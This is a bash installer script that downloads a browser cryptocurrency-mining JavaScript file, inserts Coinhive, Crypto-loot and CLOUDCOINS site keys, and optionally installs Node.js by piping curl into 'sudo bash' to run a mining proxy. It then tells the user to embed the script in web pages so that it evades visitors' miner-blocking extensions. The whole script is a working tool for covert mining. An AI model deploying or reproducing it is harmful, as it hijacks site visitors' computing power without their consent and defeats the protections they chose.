echo Generating random file name...
minerblock=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)".js"
echo Downloading script...
wget -O $minerblock https://cdn.rawgit.com/SkyrisBactera/AntiMinerblock/master/minerblock.js >/dev/null 2>/dev/null
echo What is your Coinhive site key?
read cHiveKey
echo What is your Crypto-loot site key?
read cLootKey
echo What is your CLOUDCOINS site key?
read cCoinsKey
echo Substituting the keys into $minerblock...
sed -i 's/cHive/'$cHiveKey'/g' $minerblock
sed -i 's/cLoot/'$cLootKey'/g' $minerblock
sed -i 's/cCoins/'$cCoinsKey'/g' $minerblock
echo "Do you want to enable proxy functionality? This is very recommended, however, your computer/server would have to host it (y/n)"
read proxyYes
declare -l proxyYes
proxyYes=$proxyYes
if [ "$proxyYes" == "y" ]; then
  echo Checking dependencies...
  if hash npm 2>/dev/null; then
    sudo npm install -g coin-hive-stratum
  else
    echo Installing node...
    curl -sL https://deb.nodesource.com/setup_9.x | sudo -E bash -
    echo Enter your password in order to install Node.js
    sudo apt-get install -y nodejs
    sudo npm install -g coin-hive-stratum
  fi
  echo Do you have a domain name?
  read domainYes
  declare -l domainYes
  domainYes=$domainYes
  if [ "$domainYes" == "y" ]; then
    echo What is your domain name?
    read domainName
  else
    domainName=$(dig +short myip.opendns.com @resolver1.opendns.com)
  fi
    echo Substituting the proxy into $minerblock...
    port=$(shuf -i 2000-65000 -n 1)
    strSub='CoinHive.CONFIG.WEBSOCKET_SHARDS = [["ws://'$domainName':'$port'"]];'
    sed -i 's/\/\/strSub/'$strSub'/g' $minerblock
    echo You need to run proxy.sh along with whatever server software you are using as long as you want Coinhive to work
fi
  echo You need to put the following into your HTML files that you want to have protection against Minerblockers:
  echo '<script src="'$minerblock'"></script>'
